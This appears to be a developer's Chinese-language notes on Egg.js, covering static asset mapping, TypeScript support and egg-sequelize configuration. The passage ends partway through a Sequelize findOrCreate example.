构建工具的 entry 配置决定了映射关系，如基于 webpack 封装的 roadhog、umi 等工具内置了映射关系，如果单独使用 webpack 需要根据这层映射来选择用哪种方式。

文件源码 app/assets/index.js，对应的 entry 为 index.js

本地静态服务接收以此为 entry，如请求 http://127.0.0.1:8000/index.js

构建生成的文件需要有这层映射关系，如生成 index.{hash}.js 并生成 manifest 文件描述关系如

{
  "index.js": "index.{hash}.js"
}
roadhog 完全满足这个映射关系使用 assets 模板引擎。而 umi 不满足文件映射，因为他只有一个入口 umi.js 文件，所以选择其他模板引擎的方案。

其他构建工具的接入需要满足这层映射关系。

 本地开发
查看示例配置，本地服务配置成 roadhog dev，配置 port 来检查服务是否启动完成，因为 roadhog 默认启动端口为 8000，所以这里配置成 8000。

exports.assets = {
  devServer: {
    command: 'roadhog dev',
    port: 8000,
  },
};
 部署
静态资源部署之前需要构建，配置 roadhog build 命令，并执行 npm run build

{
  "scripts": {
    "build": "SET_PUBLIC_PATH=true roadhog build"
  }
}
注意：这里添加了 SET_PUBLIC_PATH 变量是因为 roadhog 这样才能开启 publicPath

构建的结果根据 .webpackrc 配置的 output 决定，示例是放到 app/public 目录下，由 egg-static 提供服务。

同时根据 .webpackrc 配置的 manifest 生成一个 manifest.json 文件到 config 目录下（egg 需要读取这个文件作为映射关系）。

 应用提供服务
现在应用启动后可以通过 http://127.0.0.1:7001/public/index.{hash}.js 访问静态资源，发现这里多了一层 public 的路径，所以需要添加 publicPath 配置。

// config/config.prod.js
exports.assets = {
  publicPath: '/public/',
};
 使用 CDN
一般静态资源都会发到 CDN，所以在构建完成后需要平台将构建产物发布到 CDN 上，如 https://cdn/myapp/index.{hash}.js。

现在除了 publichPath 还需要修改静态资源地址

// config/config.prod.js
exports.assets = {
  url: 'https://cdn',
  publicPath: '/myapp/',
};

--------------------------------------------------
TypeScript
TypeScript is a typed superset of JavaScript that compiles to plain JavaScript.

TypeScript 的静态类型检查，智能提示，IDE 友好性等特性，对于大规模企业级应用，是非常的有价值的。详见：TypeScript体系调研报告 。

然而，此前使用 TypeScript 开发 Egg ，会遇到一些影响 开发者体验 问题：

Egg 最精髓的 Loader 自动加载机制，导致 TS 无法静态分析出部分依赖。
Config 自动合并机制下，如何在 config.{env}.js 里面修改插件提供的配置时，能校验并智能提示？
开发期需要独立开一个 tsc -w 独立进程来构建代码，带来临时文件位置纠结以及 npm scripts 复杂化。
单元测试，覆盖率测试，线上错误堆栈如何指向 TS 源文件，而不是编译后的 js 文件。
本文主要阐述：

应用层 TS 开发规范
我们在工具链方面的支持，是如何来解决上述问题，让开发者几乎无感知并保持一致性。
具体的折腾过程参见：[RFC] TypeScript tool support

 快速入门
通过骨架快速初始化：

$ npx egg-init --type=ts showcase
$ cd showcase && npm i
$ npm run dev
上述骨架会生成一个极简版的示例，更完整的示例参见：eggjs/examples/hackernews-async-ts

tegg.gif

 目录规范
一些约束：

Egg 目前没有计划使用 TS 重写。
Egg 以及它对应的插件，会提供对应的 index.d.ts 文件方便开发者使用。
TypeScript 只是其中一种社区实践，我们通过工具链给予一定程度的支持。
TypeScript 最低要求 2.8+ 版本。
整体目录结构上跟 Egg 普通项目没啥区别:

typescript 代码风格，后缀名为 ts
typings 目录用于放置 d.ts 文件（大部分会自动生成）
showcase
├── app
│   ├── controller
│   │   └── home.ts
│   ├── service
│   │   └── news.ts
│   └── router.ts
├── config
│   ├── config.default.ts
│   ├── config.local.ts
│   ├── config.prod.ts
│   └── plugin.ts
├── test
│   └── **/*.test.ts
├── typings
│   └── **/*.d.ts
├── README.md
├── package.json
├── tsconfig.json
└── tslint.json
 Controller
// app/controller/home.ts
import { Controller } from 'egg';

export default class HomeController extends Controller {
  public async index() {
    const { ctx, service } = this;
    const page = ctx.query.page;
    const result = await service.news.list(page);
    await ctx.render('home.tpl', result);
  }
}
 Router
// app/router.ts
import { Application } from 'egg';

export default (app: Application) => {
  const { router, controller } = app;
  router.get('/', controller.home.index);
};
 Service
// app/service/news.ts
import { Service } from 'egg';

export default class NewsService extends Service {
  public async list(page?: number): Promise<NewsItem[]> {
    return [];
  }
}

export interface NewsItem {
  id: number;
  title: string;
}
 Middleware
// app/middleware/robot.ts

import { Context } from 'egg';

export default function robotMiddleware() {
  return async (ctx: Context, next: any) => {
    await next();
  };
}
因为 Middleware 定义是支持入参的，第一个参数为同名的 Config，如有需求，可以用完整版：

// app/middleware/news.ts

import { Context, Application } from 'egg';
import { BizConfig } from '../../config/config.default';

// 注意，这里必须要用 ['news'] 而不能用 .news，因为 BizConfig 是 type，不是实例
export default function newsMiddleware(options: BizConfig['news'], app: Application) {
  return async (ctx: Context, next: () => Promise<any>) => {
    console.info(options.serverUrl);
    await next();
  };
}
 Extend
// app/extend/context.ts
import { Context } from 'egg';

export default {
  isAjax(this: Context) {
    return this.get('X-Requested-With') === 'XMLHttpRequest';
  },
}

// app.ts
export default app => {
  app.beforeStart(async () => {
    await Promise.resolve('egg + ts');
  });
};
 Config
Config 这块稍微有点复杂，因为要支持：

在 Controller，Service 那边使用配置，需支持多级提示，并自动关联。
Config 内部， config.view = {} 的写法，也应该支持提示。
在 config.{env}.ts 里可以用到 config.default.ts 自定义配置的提示。
// app/config/config.default.ts
import { EggAppInfo, EggAppConfig, PowerPartial } from 'egg';

// 提供给 config.{env}.ts 使用
export type DefaultConfig = PowerPartial<EggAppConfig & BizConfig>;

// 应用本身的配置 Scheme
export interface BizConfig {
  news: {
    pageSize: number;
    serverUrl: string;
  };
}

export default (appInfo: EggAppInfo) => {
  const config = {} as PowerPartial<EggAppConfig> & BizConfig;

  // 覆盖框架，插件的配置
  config.keys = appInfo.name + '123456';
  config.view = {
    defaultViewEngine: 'nunjucks',
    mapping: {
      '.tpl': 'nunjucks',
    },
  };

  // 应用本身的配置
  config.news = {
    pageSize: 30,
    serverUrl: 'https://hacker-news.firebaseio.com/v0',
  };

  return config;
};
简单版：

// app/config/config.local.ts
import { DefaultConfig } from './config.default';

export default () => {
  const config: DefaultConfig = {};
  config.news = {
    pageSize: 20,
  };
  return config;
};
备注：

TS 的 Conditional Types 是我们能完美解决 Config 提示的关键。
有兴趣的可以看下 egg/index.d.ts 里面的 PowerPartial 实现。
// {egg}/index.d.ts
type PowerPartial<T> = {
  [U in keyof T]?: T[U] extends {}
    ? PowerPartial<T[U]>
    : T[U]
};
 Plugin
// config/plugin.ts
import { EggPlugin } from 'egg';

const plugin: EggPlugin = {
  static: true,
  nunjucks: {
    enable: true,
    package: 'egg-view-nunjucks',
  },
};

export default plugin;
 Typings
该目录为 TS 的规范，在里面的 **/*.d.ts 文件将被自动识别。 //*/

开发者需要手写的建议放在 typings/index.d.ts 中。
工具会自动生成 typings/{app,config}/**.d.ts ，请勿自行修改，避免被覆盖。（见下文）//*/
 开发期
 ts-node
egg-bin 已经内建了 ts-node ，egg loader 在开发期会自动加载 *.ts 并内存编译。

目前已支持 dev / debug / test / cov 。

开发者仅需简单配置下 package.json ：

{
  "name": "showcase",
  "egg": {
    "typescript": true
  }
}
 egg-ts-helper
由于 Egg 的自动加载机制，导致 TS 无法静态分析依赖，关联提示。

幸亏 TS 黑魔法比较多，我们可以通过 TS 的 Declaration Merging 编写 d.ts 来辅助。

譬如 app/service/news.ts 会自动挂载为 ctx.service.news ，通过如下写法即识别到：

// typings/app/service/index.d.ts
import News from '../../../app/service/News';

declare module 'egg' {
  interface IService {
    news: News;
  }
}
手动写这些文件，未免有点繁琐，因此我们提供了 egg-ts-helper 工具来自动分析源码生成对应的 d.ts 文件。

只需配置下 package.json :

{
  "devDependencies": {
    "egg-ts-helper": "^1"
  },
  "scripts": {
    "dev": "egg-bin dev -r egg-ts-helper/register",
    "test-local": "egg-bin test -r egg-ts-helper/register",
    "clean": "ets clean"
  }
}
开发期将自动生成对应的 d.ts 到 typings/{app,config}/ 下，请勿自行修改，避免被覆盖。

后续该工具也会考虑支持 js 版 egg 应用的分析，可以一定程度上提升 js 开发体验。

 Unit Test && Cov
单元测试当然少不了：

// test/app/service/news.test.ts
import * as assert from 'assert';
import { Context } from 'egg';
import { app } from 'egg-mock/bootstrap';

describe('test/app/service/news.test.js', () => {
  let ctx: Context;

  before(async () => {
    ctx = app.mockContext();
  });

  it('list()', async () => {
    const list = await ctx.service.news.list();
    assert(list.length === 30);
  });
});
运行命令也跟之前一样，并内置了 错误堆栈和覆盖率 的支持：

{
  "name": "showcase",
  "scripts": {
    "test": "npm run lint -- --fix && npm run test-local",
    "test-local": "egg-bin test -r egg-ts-helper/register",
    "cov": "egg-bin cov -r egg-ts-helper/register",
    "lint": "tslint ."
  }
}
 Debug
断点调试跟之前也没啥区别，会自动通过 sourcemap 断点到正确的位置。

{
  "name": "showcase",
  "scripts": {
    "debug": "egg-bin debug -r egg-ts-helper/register",
    "debug-test": "npm run test-local -- --inspect"
  }
}
使用 VSCode 进行调试
VSCode 调试 Egg 完美版 - 进化史
 部署
 构建
正式环境下，我们更倾向于把 ts 构建为 js ，建议在 ci 上构建并打包。
配置 package.json :

{
  "egg": {
    "typescript": true
  }，
  "scripts": {
    "start": "egg-scripts start --title=egg-server-showcase",
    "stop": "egg-scripts stop --title=egg-server-showcase",
    "tsc": "ets && tsc -p tsconfig.json",
    "ci": "npm run lint && npm run cov && npm run tsc",
    "clean": "ets clean"
  }
}
对应的 tsconfig.json :

{
  "compileOnSave": true,
  "compilerOptions": {
    "target": "es2017",
    "module": "commonjs",
    "strict": true,
    "noImplicitAny": false,
    "experimentalDecorators": true,
    "emitDecoratorMetadata": true,
    "charset": "utf8",
    "allowJs": false,
    "pretty": true,
    "noEmitOnError": false,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "allowUnreachableCode": false,
    "allowUnusedLabels": false,
    "strictPropertyInitialization": false,
    "noFallthroughCasesInSwitch": true,
    "skipLibCheck": true,
    "skipDefaultLibCheck": true,
    "inlineSourceMap": true,
    "importHelpers": true
  },
  "exclude": [
    "app/public",
    "app/web",
    "app/views"
  ]
}
注意：

当有同名的 ts 和 js 文件时，egg 会优先加载 js 文件。
因此在开发期， egg-ts-helper 会自动调用清除同名的 js 文件，也可 npm run clean 手动清除。
 错误堆栈
线上服务的代码是经过编译后的 js，而我们期望看到的错误堆栈是指向 TS 源码。 因此：

在构建的时候，需配置 inlineSourceMap: true 在 js 底部插入 sourcemap 信息。
在 egg-scripts 内建了处理，会自动纠正为正确的错误堆栈，应用开发者无需担心。
具体内幕参见：

https://zhuanlan.zhihu.com/p/26267678
https://github.com/eggjs/egg-scripts/pull/19
 插件/框架开发指南
指导原则：

不建议使用 TS 直接开发插件/框架，发布到 npm 的插件应该是 js 形式。
当你开发了一个插件/框架后，需要提供对应的 index.d.ts 。
通过 Declaration Merging 将插件/框架的功能注入到 Egg 中。
都挂载到 egg 这个 module，不要用上层框架。
 插件
可以参考 egg-ts-helper 自动生成的格式

// {plugin_root}/index.d.ts

import News from '../../../app/service/News';

declare module 'egg' {

  // 扩展 service
  interface IService {
    news: News;
  }

  // 扩展 app
  interface Application {

  }

  // 扩展 context
  interface Context {

  }

  // 扩展你的配置
  interface EggAppConfig {

  }

  // 扩展自定义环境
  type EggEnvType = 'local' | 'unittest' | 'prod' | 'sit';
}
 上层框架
定义：

// {framework_root}/index.d.ts

import * as Egg from 'egg';

// 将该上层框架用到的插件 import 进来
import 'my-plugin';

declare module 'egg' {
  // 跟插件一样拓展 egg ...
}

// 将 Egg 整个 export 出去
export = Egg;
开发者使用的时候，可以直接 import 你的框架：

// app/service/news.ts

// 开发者引入你的框架，也可以使用到提示到所有 Egg 的提示
import { Service } from 'duck-egg';

export default class NewsService extends Service {
  public async list(page?: number): Promise<NewsItem[]> {
    return [];
  }
}


------------------------
# EggSequelize
配置
//config.default.js
exports.sequelize = {
  dialect: 'mysql', // support: mysql, mariadb, postgres, mssql
  database: 'test',
  host: 'localhost',
  port: '3306',
  username: 'root',
  password: '',
};

设置还有下面等方式
 // SQLite only
storage: 'path/to/database.sqlite'

// Or you can simply use a connection uri
var sequelize = new Sequelize('postgres://user:pass@example.com:5432/dbname');

## 自己搞个database.config.js.example, 在不同的config环境加载不同配置好点, 例如 
//config.prod.js
import datase from "database.config"

exports.sequelize = database.prod

//config/plugin.js
exports.sequelize = {
  enable: true,
  package: 'egg-sequelize'
}

//package.json
{
  "scripts": {
    "migrate:new": "egg-sequelize migration:create",
    "migrate:up": "egg-sequelize db:migrate",
    "migrate:down": "egg-sequelize db:migrate:undo"
  }
}

!!!
undo还可以指定返回到某一个文件
sequelize db:migrate:undo:all --to XXXXXXXXXXXXXX-create-posts.js

把model文件都放在app/model, 约定
user.js	=>  app.model.User
person.js => 	app.model.Person
user_group.js => 	app.model.UserGroup

会有created_at, updated_at
用下划线style, user_id, comments_count

# 使用方式
// app/model/user.js
// app.model是sequelize的一个实例， 可以直接用app.model.sync, app.model.quey等方法
// 这是yield的例子，现在可以直接用async await
module.exports = app => {
  const { STRING, INTEGER, DATE } = app.Sequelize;

  const User = app.model.define('user', {
    login: STRING,
    name: STRING(30),
    password: STRING(32),
    age: INTEGER,
    last_sign_in_at: DATE,
    created_at: DATE,
    updated_at: DATE,
  });

  User.findByLogin = function* (login) {
    return yield this.findOne({
      where: {
        login: login
      }
    });
  }

  User.prototype.logSignin = function* () {
    yield this.update({ last_sign_in_at: new Date() });
  }

  return User;
};

//controller
// app/controller/user.js
module.exports = app => {
  return class UserController extends app.Controller {
    * index() {
      const users = yield this.ctx.model.User.findAll();
      this.ctx.body = users;
    }

    * show() {
      const user = yield this.ctx.model.User.findByLogin(this.ctx.params.login);
      yield user.logSignin();
      this.ctx.body = user;
    }
  }
}

//来个完整点的belongs_to User的post例子
// app/model/post.js

module.exports = app => {
  const { STRING, INTEGER, DATE } = app.Sequelize;

  const Post = app.model.define('Post', {
    name: STRING(30),
    user_id: INTEGER,
    created_at: DATE,
    updated_at: DATE,
  });

  //!!!!!!!!!!!!!要记得，下面的例子，关联 hasMany, belongsTo都要用这种Model.associate = function(){} 的写法！
  Post.associate = function() {
    app.model.Post.belongsTo(app.model.User, { as: 'user' });
  }

  return Post;
};
// app/controller/post.js
module.exports = app => {
  return class PostController extends app.Controller {
    * index() {
      const posts = yield this.ctx.model.Post.findAll({
        attributes: [ 'id', 'user_id' ],
        include: { model: this.ctx.model.User, as: 'user' },
        where: { status: 'publish' },
        order: 'id desc',
      });

      this.ctx.body = posts;
    }

    * show() {
      const post = yield this.ctx.model.Post.findById(this.params.id);
      const user = yield post.getUser();
      post.setDataValue('user', user);
      this.ctx.body = post;
    }

    * destroy() {
      const post = yield this.ctx.model.Post.findById(this.params.id);
      yield post.destroy();
      this.ctx.body = { success: true };
    }
  }
}

//Sequelize有auto sync,写好model，自动同步到database, 但是还是建议用migrate, 减少团队开发，不同环境里可能产生的数据库不统一问题
// {app_root}/app.js //只在local里自动sync的例子，尽量不要用
module.exports = app => {
  if (app.config.env === 'local') {
    app.beforeStart(function* () {
      yield app.model.sync({force: true});
    });
  }
};

#Migrate
加完脚本到scripts后，就可以用 new创建migration, 可以用 up和down去migrate

npm run migrate:new	//Generate a new Migration file to ./migrations/
npm run migrate:up	//Run Migration
npm run migrate:down	//Rollback once Migration

//例子
$ npm run migrate:up

//unittest环境
$ EGG_SERVER_ENV=unittest npm run migrate:up

//prod
$ EGG_SERVER_ENV=prod npm run migrate:up

//pre 会读取config/config.pre.js
$ EGG_SERVER_ENV=pre npm run migrate:up

//Migrate脚本，这个是co跑generator版本
'use strict';
const co = require('co');

module.exports = {
  up: co.wrap(function *(db, Sequelize) {
    const { STRING, INTEGER, DATE } = Sequelize;

    yield db.createTable('users', {
      id: { type: INTEGER, primaryKey: true, autoIncrement: true },
      name: { type: STRING, allowNull: false },
      email: { type: STRING, allowNull: false },
      created_at: DATE,
      updated_at: DATE,
    });

    yield db.addIndex('users', ['email'], { indicesType: 'UNIQUE' });
  }),

  down: co.wrap(function *(db, Sequelize) {
    yield db.dropTable('users');
  }),
};

## 下面是Sequelize官方文档整理的一些资料

--------------
1)对数据库表的变动配置
sequelize.sync()和在定义model时 { force: true }参数一样，如果遇到和define不统一，会先drop掉table然后再根据定义重新创建，这个会影响原有数据，即使在development还是用migration吧

----------------------

2)sequelize的migrate用到一个sister库 umzug ,有以下功能，基本跟rails差不多,好像没有rename_column
  createTable
  addColumn
  changeColumn
  removeColumn
  addIndex
  removeIndex
  addConstraint
  removeConstraint

---------------------------------------------------

3) define, 让model和table对应起来的入口
  var Project = sequelize.define('project', {
    title: Sequelize.STRING, //一般从Sequelize module里拿出定义的类型
    description: Sequelize.TEXT
  })

  var Task = sequelize.define('task', {
    title: Sequelize.STRING,
    description: Sequelize.TEXT,
    deadline: Sequelize.DATE
  })

//对每个字段可以做的额外操作，例如加默认值等
  var Foo = sequelize.define('foo', {
   // instantiating will automatically set the flag to true if not set
   flag: { type: Sequelize.BOOLEAN, allowNull: false, defaultValue: true},

   // default values for dates => current time
   myDate: { type: Sequelize.DATE, defaultValue: Sequelize.NOW },

   // setting allowNull to false will add NOT NULL to the column, which means an error will be
   // thrown from the DB when the query is executed if the column is null. If you want to check that a value
   // is not null before querying the DB, look at the validations section below.
   title: { type: Sequelize.STRING, allowNull: false},

   // Creating two objects with the same value will throw an error. The unique property can be either a
   // boolean, or a string. If you provide the same string for multiple columns, they will form a
   // composite unique key. 
   someUnique: {type: Sequelize.STRING, unique: true},
   uniqueOne: { type: Sequelize.STRING,  unique: 'compositeIndex'}, //下面两个uniq都可以合并到index里
   uniqueTwo: { type: Sequelize.INTEGER, unique: 'compositeIndex'}

   // The unique property is simply a shorthand to create a unique index. //这里唯一会自动创建index, 等同于下面一条
   someUnique: {type: Sequelize.STRING, unique: true}
   // It's exactly the same as creating the index in the model's options. 定义index
   {someUnique: {type: Sequelize.STRING}},
   {indexes: [{unique: true, fields: ['someUnique']}]}

   // Go on reading for further information about primary keys //可以自己设置primary key
   identifier: { type: Sequelize.STRING, primaryKey: true},

   // autoIncrement can be used to create auto_incrementing integer columns //自增
   incrementMe: { type: Sequelize.INTEGER, autoIncrement: true },

   // Comments can be specified for each field for MySQL and PG //每个字段都可以加入注释
   hasComment: { type: Sequelize.INTEGER, comment: "I'm a comment!" },

   // You can specify a custom field name via the "field" attribute: //用field字段可以手动设定字段名, 映射不同的model属性
   fieldWithUnderscores: { type: Sequelize.STRING, field: "field_with_underscores" },

   // It is possible to create foreign keys: //创建外键, 尽量不用用程序做外键
   bar_id: {
     type: Sequelize.INTEGER,

     references: {
       // This is a reference to another model
       model: Bar,

       // This is the column name of the referenced model
       key: 'id',

       // This declares when to check the foreign key constraint. PostgreSQL only.
       deferrable: Sequelize.Deferrable.INITIALLY_IMMEDIATE
     }
   }
  })

  //define里头的字段数据类型
  Sequelize.STRING                      // VARCHAR(255)
  Sequelize.STRING(1234)                // VARCHAR(1234)
  Sequelize.STRING.BINARY               // VARCHAR BINARY
  Sequelize.TEXT                        // TEXT
  Sequelize.TEXT('tiny')                // TINYTEXT

  Sequelize.INTEGER                     // INTEGER
  Sequelize.BIGINT                      // BIGINT
  Sequelize.BIGINT(11)                  // BIGINT(11)

  Sequelize.FLOAT                       // FLOAT
  Sequelize.FLOAT(11)                   // FLOAT(11)
  Sequelize.FLOAT(11, 12)               // FLOAT(11,12)

  Sequelize.REAL                        // REAL        PostgreSQL only.
  Sequelize.REAL(11)                    // REAL(11)    PostgreSQL only.
  Sequelize.REAL(11, 12)                // REAL(11,12) PostgreSQL only.

  Sequelize.DOUBLE                      // DOUBLE
  Sequelize.DOUBLE(11)                  // DOUBLE(11)
  Sequelize.DOUBLE(11, 12)              // DOUBLE(11,12)

  Sequelize.DECIMAL                     // DECIMAL
  Sequelize.DECIMAL(10, 2)              // DECIMAL(10,2)

  Sequelize.DATE                        // DATETIME for mysql / sqlite, TIMESTAMP WITH TIME ZONE for postgres
  Sequelize.DATE(6)                     // DATETIME(6) for mysql 5.6.4+. Fractional seconds support with up to 6 digits of precision 
  Sequelize.DATEONLY                    // DATE without time.
  Sequelize.BOOLEAN                     // TINYINT(1)

  Sequelize.ENUM('value 1', 'value 2')  // An ENUM with allowed values 'value 1' and 'value 2'
  Sequelize.ARRAY(Sequelize.TEXT)       // Defines an array. PostgreSQL only.

  Sequelize.JSON                        // JSON column. PostgreSQL only.
  Sequelize.JSONB                       // JSONB column. PostgreSQL only.

  Sequelize.BLOB                        // BLOB (bytea for PostgreSQL) //可以同时塞string作为buffer类别
  Sequelize.BLOB('tiny')                // TINYBLOB (bytea for PostgreSQL. Other options are medium and long)

  Sequelize.UUID                        // UUID datatype for PostgreSQL and SQLite, CHAR(36) BINARY for MySQL (use defaultValue: Sequelize.UUIDV1 or Sequelize.UUIDV4 to make sequelize generate the ids automatically)

  Sequelize.RANGE(Sequelize.INTEGER)    // Defines int4range range. PostgreSQL only.
  Sequelize.RANGE(Sequelize.BIGINT)     // Defined int8range range. PostgreSQL only.
  Sequelize.RANGE(Sequelize.DATE)       // Defines tstzrange range. PostgreSQL only.
  Sequelize.RANGE(Sequelize.DATEONLY)   // Defines daterange range. PostgreSQL only.
  Sequelize.RANGE(Sequelize.DECIMAL)    // Defines numrange range. PostgreSQL only.

  Sequelize.ARRAY(Sequelize.RANGE(Sequelize.DATE)) // Defines array of tstzrange ranges. PostgreSQL only.

  Sequelize.GEOMETRY                    // Spatial column.  PostgreSQL (with PostGIS) or MySQL only.
  Sequelize.GEOMETRY('POINT')           // Spatial column with geometry type.  PostgreSQL (with PostGIS) or MySQL only.
  Sequelize.GEOMETRY('POINT', 4326)     // Spatial column with geometry type and SRID.  PostgreSQL (with PostGIS) or MySQL only.

  //如果用pg timestamp, 要注意用parser转换成不同的timezone
  require('pg').types.setTypeParser(1114, function(stringValue) {
    return new Date(stringValue + "+0000");
    // e.g., UTC offset. Use any offset that you would like.
  });

  //enum例子
  // for enums:
  sequelize.define('model', {
    states: {
      type:   Sequelize.ENUM,
      values: ['active', 'pending', 'deleted']
    }
  })


  //可以在define时定义字段的getter 和 setter做数据加工
  var Employee = sequelize.define('employee', {
    name:  {
      type     : Sequelize.STRING,
      allowNull: false,
      get      : function()  {
        var title = this.getDataValue('title');
        // 'this' allows you to access attributes of the instance
        return this.getDataValue('name') + ' (' + title + ')';
      },
    },
    title: {
      type     : Sequelize.STRING,
      allowNull: false,
      set      : function(val) {
        this.setDataValue('title', val.toUpperCase());
      }
    }
  });

  Employee
    .create({ name: 'John Doe', title: 'senior engineer' })
    .then(function(employee) {
      console.log(employee.get('name')); // John Doe (SENIOR ENGINEER)
      console.log(employee.get('title')); // SENIOR ENGINEER
  })

  //用getterMethods和setterMethods做虚拟属性
  var Foo = sequelize.define('foo', {
    firstname: Sequelize.STRING,
    lastname: Sequelize.STRING
  }, {
    getterMethods   : {
      fullName       : function()  { return this.firstname + ' ' + this.lastname }
    },

    setterMethods   : {
      fullName       : function(value) {
          var names = value.split(' ');

          this.setDataValue('firstname', names.slice(0, -1).join(' '));
          this.setDataValue('lastname', names.slice(-1).join(' '));
      },
    }
  });

  //Validation
//validation会自动在create update save时触发，也可以用validate()手动触发, 都是从validator.js继承过来的
  var ValidateMe = sequelize.define('foo', {
    foo: {
      type: Sequelize.STRING,
      validate: {
        is: ["^[a-z]+$",'i'],     // will only allow letters
        is: /^[a-z]+$/i,          // same as the previous example using real RegExp
        not: ["[a-z]",'i'],       // will not allow letters
        isEmail: true,            // checks for email format (foo@bar.com)
        isUrl: true,              // checks for url format (http://foo.com)
        isIP: true,               // checks for IPv4 (129.89.23.1) or IPv6 format
        isIPv4: true,             // checks for IPv4 (129.89.23.1)
        isIPv6: true,             // checks for IPv6 format
        isAlpha: true,            // will only allow letters
        isAlphanumeric: true,     // will only allow alphanumeric characters, so "_abc" will fail
        isNumeric: true,          // will only allow numbers
        isInt: true,              // checks for valid integers
        isFloat: true,            // checks for valid floating point numbers
        isDecimal: true,          // checks for any numbers
        isLowercase: true,        // checks for lowercase
        isUppercase: true,        // checks for uppercase
        notNull: true,            // won't allow null
        isNull: true,             // only allows null
        notEmpty: true,           // don't allow empty strings
        equals: 'specific value', // only allow a specific value
        contains: 'foo',          // force specific substrings
        notIn: [['foo', 'bar']],  // check the value is not one of these
        isIn: [['foo', 'bar']],   // check the value is one of these
        notContains: 'bar',       // don't allow specific substrings
        len: [2,10],              // only allow values with length between 2 and 10
        isUUID: 4,                // only allow uuids
        isDate: true,             // only allow date strings
        isAfter: "2011-11-05",    // only allow date strings after a specific date
        isBefore: "2011-11-05",   // only allow date strings before a specific date
        max: 23,                  // only allow values
        min: 23,                  // only allow values >= 23
        isArray: true,            // only allow arrays
        isCreditCard: true,       // check for valid credit card numbers

        // custom validations are also possible:
        isEven: function(value) {
          if(parseInt(value) % 2 != 0) {
            throw new Error('Only even values are allowed!')
          // we also are in the model's context here, so this.otherField
          // would get the value of otherField if it existed
          }
        }
      }
    }
  });

  //自定义出错msg
  isInt: {
    msg: "Must be an integer number of pennies"
  }

  //值不是boolean时，用args代表原来的值
  isIn: {
    args: [['en', 'zh']],
    msg: "Must be English or Chinese"
  }
  //如果用自定义validator的话，自定义出错信息throw到Error.msg上

  当用allowNull: true时，跟validator不冲突，例如string限制了长度6-10，但也可以allowNull

  //Model级别的validator, 例如设置了longitude, 但latitude没设置的话要报错
	var Pub = Sequelize.define('pub', {
		name: { type: Sequelize.STRING  },
		address: { type: Sequelize.STRING  },
		latitude: {
			type: Sequelize.INTEGER,
			allowNull: true,
			defaultValue: null,
			validate: { min: -90, max: 90  }
		},
		longitude: {
			type: Sequelize.INTEGER,
			allowNull: true,
			defaultValue: null,
			validate: { min: -180, max: 180  }
		},
	}, {
		validate: { //model级别的validate
			bothCoordsOrNone: function() {
				if ((this.latitude === null) !== (this.longitude === null)) {
					throw new Error('Require either both latitude and longitude or neither')
				}
			}
		}
	})

	//字段定义后面一个参数，专门做配置的
	var Bar = sequelize.define('bar', { /* bla */  }, {
			// don't add the timestamp attributes (updatedAt, createdAt)
		timestamps: false,

		// don't delete database entries but set the newly added attribute deletedAt
		// to the current date (when deletion was done). paranoid will only work if
		// timestamps are enabled
		paranoid: true,

		// don't use camelcase for automatically added attributes but underscore style
		// so updatedAt will be updated_at
		underscored: true, //用under_score style来命名model里使用的属性

		// disable the modification of table names; By default, sequelize will automatically
		// transform all passed model names (first parameter of define) into plural.
		// if you don't want that, set the following
		freezeTableName: true,

		// define the table's name
		tableName: 'my_very_custom_table_name' //可以用已有的数据库
	})

	//改mysql引擎
	var Person = sequelize.define('person', { /* attributes */  }, {
			engine: 'MYISAM'

	})

	// or globally
	var sequelize = new Sequelize(db, user, pw, {
		define: { engine: 'MYISAM'  }
	})

	//Auto Sync 同步数据库，避免使用
	// Create the tables:
	Project.sync()
	Task.sync()

	// Force the creation!
	Project.sync({force: true}) // this will drop the table first and re-create it afterwards

	// drop the tables:
	Project.drop()
	Task.drop()

	// event handling:
	Project.[sync|drop]().then(function() {
		// ok ... everything is nice!
	}).catch(function(error) {
		// oooh, did you enter wrong database credentials?
	//This will run .sync() only if database name ends with '_test' //加个match，是test是数据库才这样搞
	sequelize.sync({ force: true, match: /_test$/  });

	//Model拓展，怎么加类方法，实例方法
	var Foo = sequelize.define('foo', { /* attributes */ }, {
		classMethods: {
					method1: function(){ return 'smth'  }
				
		},
		instanceMethods: {
					method2: function() { return 'foo'  }
				
		}

	})

	// Example:
	Foo.method1()
	Foo.build().method2()

  新版里增加类方法或者实例方法，直接用es6标准就好
  User.classMethod = async function(argument) {
    // body...
  }

  User.prototype.instanceMethod =  blahblahblah...

	//实例方法里this就可以访问到字段
	var User = sequelize.define('user', { firstname: Sequelize.STRING, lastname: Sequelize.STRING  }, {
		instanceMethods: {
			getFullname: function() {
				return [this.firstname, this.lastname].join(' ')
			}
		}
	})

	// Example:
	User.build({ firstname: 'foo', lastname: 'bar'  }).getFullname() // 'foo bar'


	//全局设置所有的model都有的方法!!!
	var sequelize = new Sequelize('database', 'username', 'password', {
		Other options during the initialization could be here
		define: {
			classMethods: {
				method1: function() {},
				method2: function() {}
			},
			instanceMethods: {
				method3: function() {}
			}
		}
	})

	// Example:
	var Foo = sequelize.define('foo', { /* attributes */ });
	Foo.method1()
	Foo.method2()
	Foo.build().method3()

	//在model单独创建
	sequelize.define('user', {}, {
		indexes: [
			//Create a unique index on email
			{
				unique: true,
				fields: ['email']
			},

			// Creates a gin index on data with the jsonb_path_ops operator
			{
				fields: ['data'],
				using: 'gin',
				operator: 'jsonb_path_ops'
			},

			// By default index name will be [table]_[fields]
			// Creates a multi column partial index
			{
				name: 'public_by_author',
				fields: ['author', 'status'],
				where: {
					status: 'public'
				}
			},

			// A BTREE index with a ordered field
			{
				name: 'title_index',
				method: 'BTREE',
				fields: ['author', {attribute: 'title', collate: 'en_US', order: 'DESC', length: 5}]
			}
		]
	})

--------------------------------------------------

4) Model的用法
	// search for known ids
	Project.findById(123).then(function(project) {
		// project will be an instance of Project and stores the content of the table entry
		// with id 123. if such an entry is not defined you will get null
	})

	// search for attributes
	Project.findOne({ where: {title: 'aProject'}  }).then(function(project) {
		// project will be the first entry of the Projects table with the title 'aProject' || null
	})


	Project.findOne({
		where: {title: 'aProject'},
		attributes: ['id', ['name', 'title']]  //只拿对应的属性
	}).then(function(project) {
		// project will be the first entry of the Projects table with the title 'aProject' || null
		// project.title will contain the name of the project
	})

	//findOrCreate, 对应first_or_create, findOrBuild, 对应 first_or_initialize
User
	.findOrCreate({where: {username: 'sdepold'}, defaults: {job: 'Technical Lead JavaScript'}})
	.spread(function(user, created) {
		console.log(user.get({
			plain: true

		}))
		console.log(created)
		/*
			{
				username: 'sdepold',
				job: 'Technical Lead JavaScript',
				id: 1,
